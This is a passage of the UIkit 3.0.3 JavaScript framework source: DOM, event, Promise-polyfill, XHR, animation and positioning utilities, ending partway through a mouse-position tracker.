/*! UIkit 3.0.3 | http://www.getuikit.com | (c) 2014 - 2018 YOOtheme | MIT License */ ! function(t, e) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define("uikit", e) : (t = t || self).UIkit = e()
}(this, function() {
    "use strict";

    function p(i, n) {
        return function(t) {
            var e = arguments.length;
            return e ? 1 < e ? i.apply(n, arguments) : i.call(n, t) : i.call(n)
        }
    }
    var e = Object.prototype,
        i = e.hasOwnProperty;

    function l(t, e) {
        return i.call(t, e)
    }
    var n = {},
        r = /([a-z\d])([A-Z])/g;

    function m(t) {
        return t in n || (n[t] = t.replace(r, "$1-$2").toLowerCase()), n[t]
    }
    var o = /-(\w)/g;

    function g(t) {
        return t.replace(o, s)
    }

    function s(t, e) {
        return e ? e.toUpperCase() : ""
    }

    function a(t) {
        return t.length ? s(0, t.charAt(0)) + t.slice(1) : ""
    }
    var t = String.prototype,
        h = t.startsWith || function(t) {
            return 0 === this.lastIndexOf(t, 0)
        };

    function v(t, e) {
        return h.call(t, e)
    }
    var c = t.endsWith || function(t) {
        return this.substr(-t.length) === t
    };

    function u(t, e) {
        return c.call(t, e)
    }
    var d = function(t) {
            return ~this.indexOf(t)
        },
        f = t.includes || d,
        w = Array.prototype.includes || d;

    function b(t, e) {
        return t && (_(t) ? f : w).call(t, e)
    }
    var y = Array.isArray;

    function x(t) {
        return "function" == typeof t
    }

    function k(t) {
        return null !== t && "object" == typeof t
    }

    function $(t) {
        return k(t) && Object.getPrototypeOf(t) === e
    }

    function I(t) {
        return k(t) && t === t.window
    }

    function S(t) {
        return k(t) && 9 === t.nodeType
    }

    function T(t) {
        return k(t) && !!t.jquery
    }

    function E(t) {
        return t instanceof Node || k(t) && 1 <= t.nodeType
    }
    var C = e.toString;

    function A(t) {
        return C.call(t).match(/^\[object (NodeList|HTMLCollection)\]$/)
    }

    function N(t) {
        return "boolean" == typeof t
    }

    function _(t) {
        return "string" == typeof t
    }

    function M(t) {
        return "number" == typeof t
    }

    function D(t) {
        return M(t) || _(t) && !isNaN(t - parseFloat(t))
    }

    function O(t) {
        return void 0 === t
    }

    function B(t) {
        return N(t) ? t : "true" === t || "1" === t || "" === t || "false" !== t && "0" !== t && t
    }

    function z(t) {
        var e = Number(t);
        return !isNaN(e) && e
    }

    function P(t) {
        return parseFloat(t) || 0
    }

    function H(t) {
        return E(t) || I(t) || S(t) ? t : A(t) || T(t) ? t[0] : y(t) ? H(t[0]) : null
    }
    var F = Array.prototype;

    function L(t) {
        return E(t) ? [t] : A(t) ? F.slice.call(t) : y(t) ? t.map(H).filter(Boolean) : T(t) ? t.toArray() : []
    }

    function j(t) {
        return y(t) ? t : _(t) ? t.split(/,(?![^(]*\))/).map(function(t) {
            return D(t) ? z(t) : B(t.trim())
        }) : [t]
    }

    function W(t) {
        return t ? u(t, "ms") ? P(t) : 1e3 * P(t) : 0
    }

    function V(t, i) {
        return t === i || k(t) && k(i) && Object.keys(t).length === Object.keys(i).length && q(t, function(t, e) {
            return t === i[e]
        })
    }

    function Y(t, e, i) {
        return t.replace(new RegExp(e + "|" + i, "mg"), function(t) {
            return t === e ? i : e
        })
    }
    var R = Object.assign || function(t) {
        for (var e = [], i = arguments.length - 1; 0 < i--;) e[i] = arguments[i + 1];
        t = Object(t);
        for (var n = 0; n < e.length; n++) {
            var r = e[n];
            if (null !== r)
                for (var o in r) l(r, o) && (t[o] = r[o])
        }
        return t
    };

    function q(t, e) {
        for (var i in t)
            if (!1 === e(t[i], i)) return !1;
        return !0
    }

    function U(t, r) {
        return t.sort(function(t, e) {
            var i = t[r];
            void 0 === i && (i = 0);
            var n = e[r];
            return void 0 === n && (n = 0), n < i ? 1 : i < n ? -1 : 0
        })
    }

    function X(t, e, i) {
        return void 0 === e && (e = 0), void 0 === i && (i = 1), Math.min(Math.max(z(t) || 0, e), i)
    }

    function K() {}

    function G(t, e) {
        return t.left < e.right && t.right > e.left && t.top < e.bottom && t.bottom > e.top
    }

    function J(t, e) {
        return t.x <= e.right && t.x >= e.left && t.y <= e.bottom && t.y >= e.top
    }
    var Z = {
        ratio: function(t, e, i) {
            var n, r = "width" === e ? "height" : "width";
            return (n = {})[r] = t[e] ? Math.round(i * t[r] / t[e]) : t[r], n[e] = i, n
        },
        contain: function(i, n) {
            var r = this;
            return q(i = R({}, i), function(t, e) {
                return i = i[e] > n[e] ? r.ratio(i, e, n[e]) : i
            }), i
        },
        cover: function(i, n) {
            var r = this;
            return q(i = this.contain(i, n), function(t, e) {
                return i = i[e] < n[e] ? r.ratio(i, e, n[e]) : i
            }), i
        }
    };

    function Q(t, e, i) {
        if (k(e))
            for (var n in e) Q(t, n, e[n]);
        else {
            if (O(i)) return (t = H(t)) && t.getAttribute(e);
            L(t).forEach(function(t) {
                x(i) && (i = i.call(t, Q(t, e))), null === i ? et(t, e) : t.setAttribute(e, i)
            })
        }
    }

    function tt(t, e) {
        return L(t).some(function(t) {
            return t.hasAttribute(e)
        })
    }

    function et(t, e) {
        t = L(t), e.split(" ").forEach(function(e) {
            return t.forEach(function(t) {
                return t.removeAttribute(e)
            })
        })
    }

    function it(t, e) {
        for (var i = 0, n = [e, "data-" + e]; i < n.length; i++)
            if (tt(t, n[i])) return Q(t, n[i])
    }

    function nt(t, e) {
        return H(t) || st(t, ot(t, e))
    }

    function rt(t, e) {
        var i = L(t);
        return i.length && i || at(t, ot(t, e))
    }

    function ot(t, e) {
        return void 0 === e && (e = document), ut(t) || S(e) ? e : e.ownerDocument
    }

    function st(t, e) {
        return H(ht(t, e, "querySelector"))
    }

    function at(t, e) {
        return L(ht(t, e, "querySelectorAll"))
    }

    function ht(t, s, e) {
        if (void 0 === s && (s = document), !t || !_(t)) return null;
        var a;
        ut(t = t.replace(ct, "$1 *")) && (a = [], t = t.split(",").map(function(t, e) {
            var i = s;
            if ("!" === (t = t.trim())[0]) {
                var n = t.substr(1).trim().split(" ");
                i = gt(s.parentNode, n[0]), t = n.slice(1).join(" ").trim()
            }
            if ("-" === t[0]) {
                var r = t.substr(1).trim().split(" "),
                    o = (i || s).previousElementSibling;
                i = pt(o, t.substr(1)) ? o : null, t = r.slice(1).join(" ")
            }
            return i ? (i.id || (i.id = "uk-" + Date.now() + e, a.push(function() {
                return et(i, "id")
            })), "#" + bt(i.id) + " " + t) : null
        }).filter(Boolean).join(","), s = document);
        try {
            return s[e](t)
        } catch (t) {
            return null
        } finally {
            a && a.forEach(function(t) {
                return t()
            })
        }
    }
    var lt = /(^|,)\s*[!>+~-]/,
        ct = /([!>+~-])(?=\s+[!>+~-]|\s*$)/g;

    function ut(t) {
        return _(t) && t.match(lt)
    }
    var dt = Element.prototype,
        ft = dt.matches || dt.webkitMatchesSelector || dt.msMatchesSelector;

    function pt(t, e) {
        return L(t).some(function(t) {
            return ft.call(t, e)
        })
    }
    var mt = dt.closest || function(t) {
        var e = this;
        do {
            if (pt(e, t)) return e;
            e = e.parentNode
        } while (e && 1 === e.nodeType)
    };

    function gt(t, e) {
        return v(e, ">") && (e = e.slice(1)), E(t) ? t.parentNode && mt.call(t, e) : L(t).map(function(t) {
            return gt(t, e)
        }).filter(Boolean)
    }

    function vt(t, e) {
        for (var i = [], n = H(t).parentNode; n && 1 === n.nodeType;) pt(n, e) && i.push(n), n = n.parentNode;
        return i
    }
    var wt = window.CSS && CSS.escape || function(t) {
        return t.replace(/([^\x7f-\uFFFF\w-])/g, function(t) {
            return "\\" + t
        })
    };

    function bt(t) {
        return _(t) ? wt.call(null, t) : ""
    }
    var yt = {
        area: !0,
        base: !0,
        br: !0,
        col: !0,
        embed: !0,
        hr: !0,
        img: !0,
        input: !0,
        keygen: !0,
        link: !0,
        menuitem: !0,
        meta: !0,
        param: !0,
        source: !0,
        track: !0,
        wbr: !0
    };

    function xt(t) {
        return L(t).some(function(t) {
            return yt[t.tagName.toLowerCase()]
        })
    }

    function kt(t) {
        return L(t).some(function(t) {
            return t.offsetWidth || t.offsetHeight || t.getClientRects().length
        })
    }
    var $t = "input,select,textarea,button";

    function It(t) {
        return L(t).some(function(t) {
            return pt(t, $t)
        })
    }

    function St(t, e) {
        return L(t).filter(function(t) {
            return pt(t, e)
        })
    }

    function Tt(t, e) {
        return _(e) ? pt(t, e) || gt(t, e) : t === e || (S(e) ? e.documentElement : H(e)).contains(H(t))
    }
    var Et = /msie|trident/i.test(window.navigator.userAgent),
        Ct = "rtl" === Q(document.documentElement, "dir"),
        At = "ontouchstart" in window,
        Nt = window.PointerEvent,
        _t = At || window.DocumentTouch && document instanceof DocumentTouch || navigator.maxTouchPoints,
        Mt = Nt ? "pointerdown" : At ? "touchstart" : "mousedown",
        Dt = Nt ? "pointermove" : At ? "touchmove" : "mousemove",
        Ot = Nt ? "pointerup" : At ? "touchend" : "mouseup",
        Bt = Nt ? "pointerenter" : At ? "" : "mouseenter",
        zt = Nt ? "pointerleave" : At ? "" : "mouseleave",
        Pt = Nt ? "pointercancel" : "touchcancel";

    function Ht() {
        for (var t = [], e = arguments.length; e--;) t[e] = arguments[e];
        var i, n = Vt(t),
            r = n[0],
            o = n[1],
            s = n[2],
            a = n[3],
            h = n[4];
        return r = qt(r), s && (a = function(t, n, r) {
                var o = this;
                return function(i) {
                    t.forEach(function(t) {
                        var e = ">" === n[0] ? at(n, t).reverse().filter(function(t) {
                            return Tt(i.target, t)
                        })[0] : gt(i.target, n);
                        e && (i.delegate = t, i.current = e, r.call(o, i))
                    })
                }
            }(r, s, a)), 1 < a.length && (i = a, a = function(t) {
                return y(t.detail) ? i.apply(void 0, [t].concat(t.detail)) : i(t)
            }), o.split(" ").forEach(function(e) {
                return r.forEach(function(t) {
                    return t.addEventListener(e, a, h)
                })
            }),
            function() {
                return Ft(r, o, a, h)
            }
    }

    function Ft(t, e, i, n) {
        void 0 === n && (n = !1), t = qt(t), e.split(" ").forEach(function(e) {
            return t.forEach(function(t) {
                return t.removeEventListener(e, i, n)
            })
        })
    }

    function Lt() {
        for (var t = [], e = arguments.length; e--;) t[e] = arguments[e];
        var i = Vt(t),
            n = i[0],
            r = i[1],
            o = i[2],
            s = i[3],
            a = i[4],
            h = i[5],
            l = Ht(n, r, o, function(t) {
                var e = !h || h(t);
                e && (l(), s(t, e))
            }, a);
        return l
    }

    function jt(t, i, n) {
        return qt(t).reduce(function(t, e) {
            return t && e.dispatchEvent(Wt(i, !0, !0, n))
        }, !0)
    }

    function Wt(t, e, i, n) {
        if (void 0 === e && (e = !0), void 0 === i && (i = !1), _(t)) {
            var r = document.createEvent("CustomEvent");
            r.initCustomEvent(t, e, i, n), t = r
        }
        return t
    }

    function Vt(t) {
        return x(t[2]) && t.splice(2, 0, !1), t
    }

    function Yt(t) {
        return t && "addEventListener" in t
    }

    function Rt(t) {
        return Yt(t) ? t : H(t)
    }

    function qt(t) {
        return y(t) ? t.map(Rt).filter(Boolean) : _(t) ? at(t) : Yt(t) ? [t] : L(t)
    }

    function Ut() {
        var e = setTimeout(Lt(document, "click", function(t) {
            t.preventDefault(), t.stopImmediatePropagation(), clearTimeout(e)
        }, !0));
        jt(document, Pt)
    }
    var Xt = "Promise" in window ? window.Promise : Zt,
        Kt = function() {
            var i = this;
            this.promise = new Xt(function(t, e) {
                i.reject = e, i.resolve = t
            })
        },
        Gt = 2,
        Jt = "setImmediate" in window ? setImmediate : setTimeout;

    function Zt(t) {
        this.state = Gt, this.value = void 0, this.deferred = [];
        var e = this;
        try {
            t(function(t) {
                e.resolve(t)
            }, function(t) {
                e.reject(t)
            })
        } catch (t) {
            e.reject(t)
        }
    }
    Zt.reject = function(i) {
        return new Zt(function(t, e) {
            e(i)
        })
    }, Zt.resolve = function(i) {
        return new Zt(function(t, e) {
            t(i)
        })
    }, Zt.all = function(s) {
        return new Zt(function(i, t) {
            var n = [],
                r = 0;

            function e(e) {
                return function(t) {
                    n[e] = t, (r += 1) === s.length && i(n)
                }
            }
            0 === s.length && i(n);
            for (var o = 0; o < s.length; o += 1) Zt.resolve(s[o]).then(e(o), t)
        })
    }, Zt.race = function(n) {
        return new Zt(function(t, e) {
            for (var i = 0; i < n.length; i += 1) Zt.resolve(n[i]).then(t, e)
        })
    };
    var Qt = Zt.prototype;

    function te(s, a) {
        return new Xt(function(t, e) {
            var i = R({
                data: null,
                method: "GET",
                headers: {},
                xhr: new XMLHttpRequest,
                beforeSend: K,
                responseType: ""
            }, a);
            i.beforeSend(i);
            var n = i.xhr;
            for (var r in i)
                if (r in n) try {
                    n[r] = i[r]
                } catch (t) {}
                for (var o in n.open(i.method.toUpperCase(), s), i.headers) n.setRequestHeader(o, i.headers[o]);
            Ht(n, "load", function() {
                0 === n.status || 200 <= n.status && n.status < 300 || 304 === n.status ? t(n) : e(R(Error(n.statusText), {
                    xhr: n,
                    status: n.status
                }))
            }), Ht(n, "error", function() {
                return e(R(Error("Network Error"), {
                    xhr: n
                }))
            }), Ht(n, "timeout", function() {
                return e(R(Error("Network Timeout"), {
                    xhr: n
                }))
            }), n.send(i.data)
        })
    }

    function ee(n, r, o) {
        return new Xt(function(t, e) {
            var i = new Image;
            i.onerror = e, i.onload = function() {
                return t(i)
            }, o && (i.sizes = o), r && (i.srcset = r), i.src = n
        })
    }

    function ie(t) {
        if ("loading" === document.readyState) var e = Ht(document, "DOMContentLoaded", function() {
            e(), t()
        });
        else t()
    }

    function ne(t, e) {
        return e ? L(t).indexOf(H(e)) : L((t = H(t)) && t.parentNode.children).indexOf(t)
    }

    function re(t, e, i, n) {
        void 0 === i && (i = 0), void 0 === n && (n = !1);
        var r = (e = L(e)).length;
        return t = D(t) ? z(t) : "next" === t ? i + 1 : "previous" === t ? i - 1 : ne(e, t), n ? X(t, 0, r - 1) : (t %= r) < 0 ? t + r : t
    }

    function oe(t) {
        return (t = be(t)).innerHTML = "", t
    }

    function se(t, e) {
        return t = be(t), O(e) ? t.innerHTML : ae(t.hasChildNodes() ? oe(t) : t, e)
    }

    function ae(e, t) {
        return e = be(e), ce(t, function(t) {
            return e.appendChild(t)
        })
    }

    function he(e, t) {
        return e = be(e), ce(t, function(t) {
            return e.parentNode.insertBefore(t, e)
        })
    }

    function le(e, t) {
        return e = be(e), ce(t, function(t) {
            return e.nextSibling ? he(e.nextSibling, t) : ae(e.parentNode, t)
        })
    }

    function ce(t, e) {
        return (t = _(t) ? ve(t) : t) ? "length" in t ? L(t).map(e) : e(t) : null
    }

    function ue(t) {
        L(t).map(function(t) {
            return t.parentNode && t.parentNode.removeChild(t)
        })
    }

    function de(t, e) {
        for (e = H(he(t, e)); e.firstChild;) e = e.firstChild;
        return ae(e, t), e
    }

    function fe(t, e) {
        return L(L(t).map(function(t) {
            return t.hasChildNodes ? de(L(t.childNodes), e) : ae(t, e)
        }))
    }

    function pe(t) {
        L(t).map(function(t) {
            return t.parentNode
        }).filter(function(t, e, i) {
            return i.indexOf(t) === e
        }).forEach(function(t) {
            he(t, t.childNodes), ue(t)
        })
    }
    Qt.resolve = function(t) {
        var e = this;
        if (e.state === Gt) {
            if (t === e) throw new TypeError("Promise settled with itself.");
            var i = !1;
            try {
                var n = t && t.then;
                if (null !== t && k(t) && x(n)) return void n.call(t, function(t) {
                    i || e.resolve(t), i = !0
                }, function(t) {
                    i || e.reject(t), i = !0
                })
            } catch (t) {
                return void(i || e.reject(t))
            }
            e.state = 0, e.value = t, e.notify()
        }
    }, Qt.reject = function(t) {
        var e = this;
        if (e.state === Gt) {
            if (t === e) throw new TypeError("Promise settled with itself.");
            e.state = 1, e.value = t, e.notify()
        }
    }, Qt.notify = function() {
        var o = this;
        Jt(function() {
            if (o.state !== Gt)
                for (; o.deferred.length;) {
                    var t = o.deferred.shift(),
                        e = t[0],
                        i = t[1],
                        n = t[2],
                        r = t[3];
                    try {
                        0 === o.state ? x(e) ? n(e.call(void 0, o.value)) : n(o.value) : 1 === o.state && (x(i) ? n(i.call(void 0, o.value)) : r(o.value))
                    } catch (t) {
                        r(t)
                    }
                }
        })
    }, Qt.then = function(i, n) {
        var r = this;
        return new Zt(function(t, e) {
            r.deferred.push([i, n, t, e]), r.notify()
        })
    }, Qt.catch = function(t) {
        return this.then(void 0, t)
    };
    var me = /^\s*<(\w+|!)[^>]*>/,
        ge = /^<(\w+)\s*\/?>(?:<\/\1>)?$/;

    function ve(t) {
        var e = ge.exec(t);
        if (e) return document.createElement(e[1]);
        var i = document.createElement("div");
        return me.test(t) ? i.insertAdjacentHTML("beforeend", t.trim()) : i.textContent = t, 1 < i.childNodes.length ? L(i.childNodes) : i.firstChild
    }

    function we(t, e) {
        if (t && 1 === t.nodeType)
            for (e(t), t = t.firstElementChild; t;) we(t, e), t = t.nextElementSibling
    }

    function be(t, e) {
        return _(t) ? xe(t) ? H(ve(t)) : st(t, e) : H(t)
    }

    function ye(t, e) {
        return _(t) ? xe(t) ? L(ve(t)) : at(t, e) : L(t)
    }

    function xe(t) {
        return "<" === t[0] || t.match(/^\s*</)
    }

    function ke(t) {
        for (var e = [], i = arguments.length - 1; 0 < i--;) e[i] = arguments[i + 1];
        Ce(t, e, "add")
    }

    function $e(t) {
        for (var e = [], i = arguments.length - 1; 0 < i--;) e[i] = arguments[i + 1];
        Ce(t, e, "remove")
    }

    function Ie(t, e) {
        Q(t, "class", function(t) {
            return (t || "").replace(new RegExp("\\b" + e + "\\b", "g"), "")
        })
    }

    function Se(t) {
        for (var e = [], i = arguments.length - 1; 0 < i--;) e[i] = arguments[i + 1];
        e[0] && $e(t, e[0]), e[1] && ke(t, e[1])
    }

    function Te(t, e) {
        return e && L(t).some(function(t) {
            return t.classList.contains(e.split(" ")[0])
        })
    }

    function Ee(t) {
        for (var n = [], e = arguments.length - 1; 0 < e--;) n[e] = arguments[e + 1];
        if (n.length) {
            var r = _((n = Ae(n))[n.length - 1]) ? [] : n.pop();
            n = n.filter(Boolean), L(t).forEach(function(t) {
                for (var e = t.classList, i = 0; i < n.length; i++) _e.Force ? e.toggle.apply(e, [n[i]].concat(r)) : e[(O(r) ? !e.contains(n[i]) : r) ? "add" : "remove"](n[i])
            })
        }
    }

    function Ce(t, i, n) {
        (i = Ae(i).filter(Boolean)).length && L(t).forEach(function(t) {
            var e = t.classList;
            _e.Multiple ? e[n].apply(e, i) : i.forEach(function(t) {
                return e[n](t)
            })
        })
    }

    function Ae(t) {
        return t.reduce(function(t, e) {
            return t.concat.call(t, _(e) && b(e, " ") ? e.trim().split(" ") : e)
        }, [])
    }
    var Ne, _e = {};
    (Ne = document.createElement("_").classList) && (Ne.add("a", "b"), Ne.toggle("c", !1), _e.Multiple = Ne.contains("b"), _e.Force = !Ne.contains("c"));
    var Me = {
        "animation-iteration-count": !(Ne = null),
        "column-count": !0,
        "fill-opacity": !0,
        "flex-grow": !0,
        "flex-shrink": !0,
        "font-weight": !0,
        "line-height": !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        widows: !0,
        "z-index": !0,
        zoom: !0
    };

    function De(t, e, r) {
        return L(t).map(function(i) {
            if (_(e)) {
                if (e = Fe(e), O(r)) return Be(i, e);
                r || M(r) ? i.style[e] = D(r) && !Me[e] ? r + "px" : r : i.style.removeProperty(e)
            } else {
                if (y(e)) {
                    var n = Oe(i);
                    return e.reduce(function(t, e) {
                        return t[e] = n[Fe(e)], t
                    }, {})
                }
                k(e) && q(e, function(t, e) {
                    return De(i, e, t)
                })
            }
            return i
        })[0]
    }

    function Oe(t, e) {
        return (t = H(t)).ownerDocument.defaultView.getComputedStyle(t, e)
    }

    function Be(t, e, i) {
        return Oe(t, i)[e]
    }
    var ze = {};

    function Pe(t) {
        var e = document.documentElement;
        if (!Et) return Oe(e).getPropertyValue("--uk-" + t);
        if (!(t in ze)) {
            var i = ae(e, document.createElement("div"));
            ke(i, "uk-" + t), ze[t] = Be(i, "content", ":before").replace(/^["'](.*)["']$/, "$1"), ue(i)
        }
        return ze[t]
    }
    var He = {};

    function Fe(t) {
        var e = He[t];
        return e || (e = He[t] = function(t) {
            if ((t = m(t)) in je) return t;
            var e, i = Le.length;
            for (; i--;)
                if ((e = "-" + Le[i] + "-" + t) in je) return e
        }(t) || t), e
    }
    var Le = ["webkit", "moz", "ms"],
        je = document.createElement("_").style;

    function We(t, s, a, h) {
        return void 0 === a && (a = 400), void 0 === h && (h = "linear"), Xt.all(L(t).map(function(o) {
            return new Xt(function(i, n) {
                for (var t in s) {
                    var e = De(o, t);
                    "" === e && De(o, t, e)
                }
                var r = setTimeout(function() {
                    return jt(o, "transitionend")
                }, a);
                Lt(o, "transitionend transitioncanceled", function(t) {
                    var e = t.type;
                    clearTimeout(r), $e(o, "uk-transition"), De(o, {
                        "transition-property": "",
                        "transition-duration": "",
                        "transition-timing-function": ""
                    }), "transitioncanceled" === e ? n() : i()
                }, !1, function(t) {
                    var e = t.target;
                    return o === e
                }), ke(o, "uk-transition"), De(o, R({
                    "transition-property": Object.keys(s).map(Fe).join(","),
                    "transition-duration": a + "ms",
                    "transition-timing-function": h
                }, s))
            })
        }))
    }
    var Ve = {
            start: We,
            stop: function(t) {
                return jt(t, "transitionend"), Xt.resolve()
            },
            cancel: function(t) {
                jt(t, "transitioncanceled")
            },
            inProgress: function(t) {
                return Te(t, "uk-transition")
            }
        },
        Ye = "uk-animation-",
        Re = "uk-cancel-animation";

    function qe(t, e, i, a, h) {
        var l = arguments;
        return void 0 === i && (i = 200), Xt.all(L(t).map(function(s) {
            return new Xt(function(n, r) {
                if (Te(s, Re)) requestAnimationFrame(function() {
                    return Xt.resolve().then(function() {
                        return qe.apply(void 0, l).then(n, r)
                    })
                });
                else {
                    var t = e + " " + Ye + (h ? "leave" : "enter");
                    v(e, Ye) && (a && (t += " uk-transform-origin-" + a), h && (t += " " + Ye + "reverse")), o(), Lt(s, "animationend animationcancel", function(t) {
                        var e = t.type,
                            i = !1;
                        "animationcancel" === e ? (r(), o()) : (n(), Xt.resolve().then(function() {
                            i = !0, o()
                        })), requestAnimationFrame(function() {
                            i || (ke(s, Re), requestAnimationFrame(function() {
                                return $e(s, Re)
                            }))
                        })
                    }, !1, function(t) {
                        var e = t.target;
                        return s === e
                    }), De(s, "animationDuration", i + "ms"), ke(s, t)
                }

                function o() {
                    De(s, "animationDuration", ""), Ie(s, Ye + "\\S*")
                }
            })
        }))
    }
    var Ue = new RegExp(Ye + "(enter|leave)"),
        Xe = { in : function(t, e, i, n) {
                return qe(t, e, i, n, !1)
            }, out: function(t, e, i, n) {
                return qe(t, e, i, n, !0)
            }, inProgress: function(t) {
                return Ue.test(Q(t, "class"))
            }, cancel: function(t) {
                jt(t, "animationcancel")
            }
        },
        Ke = {
            width: ["x", "left", "right"],
            height: ["y", "top", "bottom"]
        };

    function Ge(t, e, c, u, d, i, n, r) {
        c = oi(c), u = oi(u);
        var f = {
            element: c,
            target: u
        };
        if (!t || !e) return f;
        var p = Ze(t),
            m = Ze(e),
            g = m;
        if (ri(g, c, p, -1), ri(g, u, m, 1), d = si(d, p.width, p.height), i = si(i, m.width, m.height), d.x += i.x, d.y += i.y, g.left += d.x, g.top += d.y, n) {
            var o = [Ze(di(t))];
            r && o.unshift(Ze(r)), q(Ke, function(t, s) {
                var a = t[0],
                    h = t[1],
                    l = t[2];
                (!0 === n || b(n, a)) && o.some(function(n) {
                    var t = c[a] === h ? -p[s] : c[a] === l ? p[s] : 0,
                        e = u[a] === h ? m[s] : u[a] === l ? -m[s] : 0;
                    if (g[h] < n[h] || g[h] + p[s] > n[l]) {
                        var i = p[s] / 2,
                            r = "center" === u[a] ? -m[s] / 2 : 0;
                        return "center" === c[a] && (o(i, r) || o(-i, -r)) || o(t, e)
                    }

                    function o(e, t) {
                        var i = g[h] + e + t - 2 * d[a];
                        if (i >= n[h] && i + p[s] <= n[l]) return g[h] = i, ["element", "target"].forEach(function(t) {
                            f[t][a] = e ? f[t][a] === Ke[s][1] ? Ke[s][2] : Ke[s][1] : f[t][a]
                        }), !0
                    }
                })
            })
        }
        return Je(t, g), f
    }

    function Je(i, n) {
        if (i = H(i), !n) return Ze(i);
        var r = Je(i),
            o = De(i, "position");
        ["left", "top"].forEach(function(t) {
            if (t in n) {
                var e = De(i, t);
                De(i, t, n[t] - r[t] + P("absolute" === o && "auto" === e ? Qe(i)[t] : e))
            }
        })
    }

    function Ze(t) {
        var e, i, n = di(t = H(t)),
            r = n.pageYOffset,
            o = n.pageXOffset;
        if (I(t)) {
            var s = t.innerHeight,
                a = t.innerWidth;
            return {
                top: r,
                left: o,
                height: s,
                width: a,
                bottom: r + s,
                right: o + a
            }
        }
        kt(t) || (e = Q(t, "style"), i = Q(t, "hidden"), Q(t, {
            style: (e || "") + ";display:block !important;",
            hidden: null
        }));
        var h = t.getBoundingClientRect();
        return O(e) || Q(t, {
            style: e,
            hidden: i
        }), {
            height: h.height,
            width: h.width,
            top: h.top + r,
            left: h.left + o,
            bottom: h.bottom + r,
            right: h.right + o
        }
    }

    function Qe(n) {
        var r = (n = H(n)).offsetParent || fi(n).documentElement,
            o = Je(r),
            t = ["top", "left"].reduce(function(t, e) {
                var i = a(e);
                return t[e] -= o[e] + P(De(n, "margin" + i)) + P(De(r, "border" + i + "Width")), t
            }, Je(n));
        return {
            top: t.top,
            left: t.left
        }
    }
    var ti = ii("height"),
        ei = ii("width");

    function ii(n) {
        var r = a(n);
        return function(t, e) {
            if (t = H(t), O(e)) {
                if (I(t)) return t["inner" + r];
                if (S(t)) {
                    var i = t.documentElement;
                    return Math.max(i["offset" + r], i["scroll" + r])
                }
                return (e = "auto" === (e = De(t, n)) ? t["offset" + r] : P(e) || 0) - ni(n, t)
            }
            De(t, n, e || 0 === e ? +e + ni(n, t) + "px" : "")
        }
    }

    function ni(t, i, e) {
        return void 0 === e && (e = "border-box"), De(i, "boxSizing") === e ? Ke[t].slice(1).map(a).reduce(function(t, e) {
            return t + P(De(i, "padding" + e)) + P(De(i, "border" + e + "Width"))
        }, 0) : 0
    }

    function ri(o, s, a, h) {
        q(Ke, function(t, e) {
            var i = t[0],
                n = t[1],
                r = t[2];
            s[i] === r ? o[n] += a[e] * h : "center" === s[i] && (o[n] += a[e] * h / 2)
        })
    }

    function oi(t) {
        var e = /left|center|right/,
            i = /top|center|bottom/;
        return 1 === (t = (t || "").split(" ")).length && (t = e.test(t[0]) ? t.concat(["center"]) : i.test(t[0]) ? ["center"].concat(t) : ["center", "center"]), {
            x: e.test(t[0]) ? t[0] : "center",
            y: i.test(t[1]) ? t[1] : "center"
        }
    }

    function si(t, e, i) {
        var n = (t || "").split(" "),
            r = n[0],
            o = n[1];
        return {
            x: r ? P(r) * (u(r, "%") ? e / 100 : 1) : 0,
            y: o ? P(o) * (u(o, "%") ? i / 100 : 1) : 0
        }
    }

    function ai(t) {
        switch (t) {
            case "left":
                return "right";
            case "right":
                return "left";
            case "top":
                return "bottom";
            case "bottom":
                return "top";
            default:
                return t
        }
    }

    function hi(t, e, i) {
        if (void 0 === e && (e = 0), void 0 === i && (i = 0), !kt(t)) return !1;
        var n = di(t = H(t)),
            r = t.getBoundingClientRect(),
            o = {
                top: -e,
                left: -i,
                bottom: e + ti(n),
                right: i + ei(n)
            };
        return G(r, o) || J({
            x: r.left,
            y: r.top
        }, o)
    }

    function li(t, e) {
        if (void 0 === e && (e = 0), !kt(t)) return 0;
        var i = di(t = H(t)),
            n = fi(t),
            r = t.offsetHeight + e,
            o = ui(t)[0],
            s = ti(i),
            a = s + Math.min(0, o - s),
            h = Math.max(0, s - (ti(n) + e - (o + r)));
        return X((a + i.pageYOffset - o) / ((a + (r - (h < s ? h : 0))) / 100) / 100)
    }

    function ci(t, e) {
        if (I(t = H(t)) || S(t)) {
            var i = di(t);
            (0, i.scrollTo)(i.pageXOffset, e)
        } else t.scrollTop = e
    }

    function ui(t) {
        var e = [0, 0];
        do {
            if (e[0] += t.offsetTop, e[1] += t.offsetLeft, "fixed" === De(t, "position")) {
                var i = di(t);
                return e[0] += i.pageYOffset, e[1] += i.pageXOffset, e
            }
        } while (t = t.offsetParent);
        return e
    }

    function di(t) {
        return I(t) ? t : fi(t).defaultView
    }

    function fi(t) {
        return H(t).ownerDocument
    }
    var pi = {
        reads: [],
        writes: [],
        read: function(t) {
            return this.reads.push(t), mi(), t
        },
        write: function(t) {
            return this.writes.push(t), mi(), t
        },
        clear: function(t) {
            return vi(this.reads, t) || vi(this.writes, t)
        },
        flush: function() {
            gi(this.reads), gi(this.writes.splice(0, this.writes.length)), this.scheduled = !1, (this.reads.length || this.writes.length) && mi()
        }
    };

    function mi() {
        pi.scheduled || (pi.scheduled = !0, requestAnimationFrame(pi.flush.bind(pi)))
    }

    function gi(t) {
        for (var e; e = t.shift();) e()
    }

    function vi(t, e) {
        var i = t.indexOf(e);
        return !!~i && !!t.splice(i, 1)
    }

    function wi() {}

    function bi(t, e) {
        return (e.y - t.y) / (e.x - t.x)
    }
    wi.prototype = {
        positions: [],
        position: null,
        init: function() {
            var n = this;
            this.positions = [], this.position = null;
            var r = !1;
            this.unbind = Ht(document, "mousemove", function(i) {
                r || (setTimeout(function() {
                    var t = Date.now(),
                        e = n.positions.length;
                    e && 100 < t - n.positions[e - 1].time && n.positions.splice(0, e), n.positions.push({
                        time: t,
                        x: i.pageX,
                        y: i.pageY
                    }), 5 < n.positions.length && n.positions.shift(), r = !1
                }, 5), r = !0)
            })
        },
        cancel: function() {
            this.unbind && this.unbind()
        },
        movesTo: function(t) {
            if (this.positions.length < 2) return !1;
            var e = Je(t),
                i = this.positions[this.positions.length - 1],
                n = this.positions[0];
            if (e.left <= i.x && i.x <= e.right && e.top <= i.y && i.y <= e.bottom) return !1;
            var r = [
                [{
                    x: e.left,
                    y: e.top
                }, {
                    x: e.right,
                    y: e.bottom
                }],
                [{
                    x: e.right,
                    y: e.top
                }, {
